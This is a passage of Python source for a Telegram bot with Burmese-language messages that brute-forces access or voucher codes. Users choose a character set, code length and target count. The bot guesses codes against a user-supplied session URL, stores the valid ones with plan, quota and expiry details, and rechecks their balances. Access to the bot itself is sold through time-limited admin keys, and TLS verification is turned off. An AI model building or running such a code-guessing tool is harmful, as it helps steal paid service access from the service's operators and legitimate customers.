        limited_texts.pop(cid, None)
        last_scan_params.pop(cid, None)
        pending_brute.pop(cid, None)
        success_messages.pop(cid, None)
        limited_messages.pop(cid, None)
        # Clear user's codes from GitHub
        try:
            results, sha = await get_file_content("result.json")
            if str(cid) in results:
                del results[str(cid)]
                await update_file_content("result.json", results, sha, f"Clear codes for {cid} on new setup")
        except Exception as e:
            print(f"[setup] Failed to clear GitHub result.json: {e}")
        await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
    else:
        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message,
            "အသုံးပြုနည်း:\n"
            "/brute <mode> <length> [target]\n\n"
            "Mode:\n"
            "  1 = ဂဏန်းသီးသန့် (0-9)\n"
            "  2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
            "  3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
            "  4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
            "  5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n\n"
            "ဥပမာ:\n"
            "/brute 1 6 5    (ဂဏန်း ၆လုံး၊ ၅ခုရှာ)\n"
            "/brute 2 6      (စာလုံးအသေး ၆လုံး)\n"
            "/brute 5 8 10   (စာလုံး+ဂဏန်း ၈လုံး၊ ၁၀ခုရှာ)"
        )
        return

    try:
        mode = int(args[1])
        length = int(args[2])
        target = int(args[3]) if len(args) > 3 else None
        
        if mode not in [1, 2, 3, 4, 5]:
            await bot.reply_to(message, "❌ Mode သည် 1-5 အတွင်းဖြစ်ရပါမည်။")
            return
        if length < 1 or length > 12:
            await bot.reply_to(message, "❌ Length သည် 1-12 အတွင်းဖြစ်ရပါမည်။")
            return
        if target is not None and target < 1:
            await bot.reply_to(message, "❌ Target သည် 1 ထက်ကြီးရပါမည်။")
            return
    except ValueError:
        await bot.reply_to(message, "❌ Mode, Length, Target များသည် ဂဏန်းဖြစ်ရပါမည်။")
        return

    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
                   InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": []}
        prev = last_scan_params[chat_id]
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, length: {prev.get('length', '?')}, target: {prev['target']}).\nပြန်စမလား၊ အသစ်စမလား?",
            reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode, length, target, message)

async def start_brute_scan(chat_id, mode, length, target, original_message, plan_filters=None):
    plan_filters = plan_filters or []
    filter_note = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
    progress_msg = await bot.send_message(chat_id, f"Preparing...{filter_note}")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, length, chat_id, user_data[chat_id]['session_url'],
            scan_id, target, message=original_message, progress_msg=progress_msg,
            plan_filters=plan_filters
        )
    )
    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id
    }
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data:
        data["stop"] = True
        if not data["task"].done():
            data["task"].cancel()
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ ပြန်စလိုပါက /resume ကိုသုံးပါ။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], message, plan_filters=params.get('plan_filters', []))
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။", chat_id=chat_id, message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], call.message, plan_filters=params.get('plan_filters', []))
    else:  # new_scan
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id)
            last_scan_params.pop(chat_id, None)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], call.message, plan_filters=params.get('plan_filters', []))
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return

    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        for item in success:
            c = item["code"]
            plan = item.get("plan", "N/A")
            usage = item.get("usage", "N/A")
            quota = item.get("quota", "N/A")
            expire = item.get("expire", "N/A")
            
            line = f"`{c}` – ⏳ {plan}"
            if usage != "N/A":
                line += f"\n   📊 Usage: {usage}"
            if quota != "N/A":
                line += f"\n   💾 Quota: {quota}"
            if expire != "N/A":
                line += f"\n   📅 Expire: {expire}"
            parts.append(line)
            parts.append("")  # empty line between codes
    if limited:
        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(limited)

    full_text = "\n".join(parts)
    # Send in chunks if too long
    MAX = 4096
    if len(full_text) > MAX:
        for i in range(0, len(full_text), MAX):
            await bot.send_message(chat_id, full_text[i:i+MAX], parse_mode="Markdown")
    else:
        await bot.reply_to(message, full_text, parse_mode="Markdown")

@bot.message_handler(commands=['delete_saved'])
async def delete_saved(message):
    chat_id = message.chat.id
    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)
    
    # Also clear from GitHub
    try:
        results, sha = await get_file_content("result.json")
        if str(chat_id) in results:
            del results[str(chat_id)]
            await update_file_content("result.json", results, sha, f"Clear codes for {chat_id}")
    except Exception as e:
        print(f"[delete_saved] Error: {e}")
    
    await bot.reply_to(message, "🗑️ Saved codes များအားလုံးဖျက်ပြီးပါပြီ။")

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
    current = notify_setting.get(chat_id, DEFAULT_NOTIFY)
    notify_setting[chat_id] = not current
    state = "ON" if notify_setting[chat_id] else "OFF"
    await bot.reply_to(message, f"Notify: {state}")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
        return
    await bot.reply_to(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")
    new_success = []
    for item in success:
        code = item["code"]
        recode = await perform_check(
            user_data[chat_id]['session_url'], code, chat_id,
            recheck=True, message=message
        )
        if recode:
            new_success.append(item)  # keep original dict with plan
    if new_success:
        success_texts[chat_id] = new_success
        codes_str = "\n".join([i["code"] for i in new_success])
        await bot.reply_to(message, f"✅ Rechecked Codes:\n{codes_str}")
    else:
        success_texts[chat_id] = []
        await bot.reply_to(message, "Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}"
    )

@bot.message_handler(commands=['testbalance'])
async def testbalance(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    chat_id = message.chat.id

    # Collect test targets: stored success codes for this chat, or all chats
    targets = []
    for cid, items in success_texts.items():
        for item in items:
            targets.append({
                "chat_id": cid, 
                "code": item["code"], 
                "session_id": item["session_id"],
                "plan": item.get("plan", "N/A"),
                "usage": item.get("usage", "N/A"),
                "quota": item.get("quota", "N/A")
            })

    if not targets:
        await bot.reply_to(message, "⚠️ Success code မရှိသေးပါ။ Scan လုပ်ပြီး code တွေ့မှ testbalance သုံးလို့ရပါမည်။")
        return

    await bot.reply_to(message, f"🔍 Testing balance for {len(targets)} code(s)...")

    for t in targets[:3]:  # max 3 codes to avoid spam
        sid = t["session_id"]
        code = t["code"]
        
        # Get full balance info
        balance_info = await get_balance(sid)
        
        result = (
            f"🎯 Code: `{code}`\n"
            f"🔑 Session ID: `{sid}`\n"
            f"⏳ Time: {balance_info.get('time', 'N/A')}\n"
            f"📊 Usage: {balance_info.get('usage', 'N/A')}\n"
            f"💾 Quota: {balance_info.get('quota', 'N/A')}\n"
            f"📋 Plan: {balance_info.get('plan', 'N/A')}\n"
            f"📅 Expire: {balance_info.get('expire', 'N/A')}"
        )
        await bot.send_message(chat_id, result, parse_mode="Markdown")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage:\n/genkey 1h30m 123456789\n/genkey unlimited 123456789")
        return
    plan = args[1]
    user_id = args[2]
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "Duration ပုံစံမမှန်ပါ။ ဥပမာ: 30m, 1h, 2d, 1h30m, unlimited")
        return
    auth_list, sha = await get_file_content("auth_list.json")
    auth_list[user_id] = {"expires_at": expiry, "plan": plan}
    await update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}")
    await bot.reply_to(message, f"✅ Key Generated\n\nUSER ID : {user_id}\nPLAN : {plan}\nEXPIRES : {expiry}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/delkey 123456789")
        return
    user_id = args[1]
    auth_list, sha = await get_file_content("auth_list.json")
    if user_id not in auth_list:
        await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
        return
    del auth_list[user_id]
    await update_file_content("auth_list.json", auth_list, sha, f"Delete key for {user_id}")
    approve.pop(int(user_id), None)
    user_data.pop(int(user_id), None)
    await bot.reply_to(message, f"✅ Key Deleted\n\nUSER ID : {user_id}")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

# ── Polling and main ──────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
